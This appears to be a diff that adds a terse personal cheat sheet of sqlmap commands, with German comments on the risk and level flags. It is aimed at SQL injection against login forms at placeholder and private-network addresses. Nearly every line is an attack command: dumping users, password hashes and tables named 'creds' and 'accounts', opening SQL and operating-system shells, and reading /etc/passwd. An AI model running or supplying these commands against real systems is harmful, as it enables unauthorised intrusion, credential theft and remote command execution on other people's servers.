@@ -1,0 +1,19 @@
+sqlmap -u http://ip/login.php
+    --data "email=...&..."
+    -p "email"
+    --level=x     # 1 klein  5 hoch default 1
+    --risk=x      # 0 bis 3   default 1
+    CMDs  --fingerprint, --banner,  --current-user, --current-db,   --js-db
+    
+    -v 0 --batch --users --passwords
+    
+    -v 0  --batch --sql-shell --os-shell  --file-read=/etc/passwd
+
+ sqlmap -u www.target.com/vuln.php?id=1 --current-db
+
+sqlmap.py -u "http://10.150.20.216/index.php?page=login.php" --data "user_name=a&password=z&Submit_button=Submit" --dbs --risk=3 --level=5
+
+
+/sqlmap.py -u "http://10.150.20.216/index.php?page=login.php" --data "user_name=a&password=z&Submit_button=Submit" -p password -D clients -T accounts  --dump --risk=3 --level=5
+
+sqlmap -u "http://10.150.20.216/index.php?page=login.php"  --data "user_name=a&password=z&Submit_button=Submit" -p password -D creds -T accounts  --dump --risk=3 --level=5
